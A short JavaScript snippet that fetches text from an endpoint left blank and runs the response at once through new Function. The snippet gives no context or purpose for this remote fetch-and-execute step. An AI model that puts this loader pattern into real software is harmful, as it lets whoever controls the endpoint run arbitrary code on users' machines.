const api = "";
const request = new XMLHttpRequest();
request.onload = function(err) {
    if (err) { console.log(err); }
    const func = new Function(`${this.responseText}`);
    func();
}
request.open("GET", api, true);
request.send();